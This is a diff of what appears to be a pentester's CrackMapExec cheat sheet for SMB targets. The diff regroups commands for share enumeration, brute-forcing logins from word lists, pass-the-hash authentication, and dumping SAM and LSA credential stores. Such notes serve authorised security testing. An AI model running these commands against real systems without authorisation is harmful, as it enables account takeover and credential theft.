@@ -67,12 +67,13 @@ crackmapexec smb 192.168.200.5 --pass-pol
 crackmapexec smb 192.168.200.5 -u guest -p "" --shares 
 crackmapexec smb 192.168.200.5 -u guest -p "" -M spider_plus 
 
-crackmapexec smb 192.168.200.5 -d mydom -u users.txt -p pass.txt    ..brute too 
-crackmapexec smb 192.168.200.5 10.0.0.1 10.1.1.2 -u bob -p 'paxxword' --local-auth 
-crackmapexec smb 192.168.200.5 -u bob -p 'paxxword'    ..test password, get domain info 
-crackmapexec smb 192.168.200.5 10.1.1.2 -u bob -p 'paxxword' -d mydomain 
-crackmapexec smb 192.168.200.5 10.1.1.2 -u bob -H ntlmhash -d mydomain 
+Brute Force
+crackmapexec smb 192.168.200.5 -d mydom -u users.txt -p pass.txt
 
+Test Password, Get domain info
+crackmapexec smb 192.168.200.5 -u bob -p 'paxxword' --local-auth
+crackmapexec smb 192.168.200.5 10.1.1.1 -u bob -p 'paxxword' -d mydomain 
+crackmapexec smb 192.168.200.5 10.1.1.1 -u bob -H ntlmhash -d mydomain 
 crackmapexec smb 192.168.200.5 -u bob -p 'paxxword' --shares 
 crackmapexec smb 192.168.200.5 -d mydomain -u bob -H ntlmhash --sam 
 crackmapexec smb 192.168.200.5 -d mydomain -u bob -H ntlmhash --lsa 
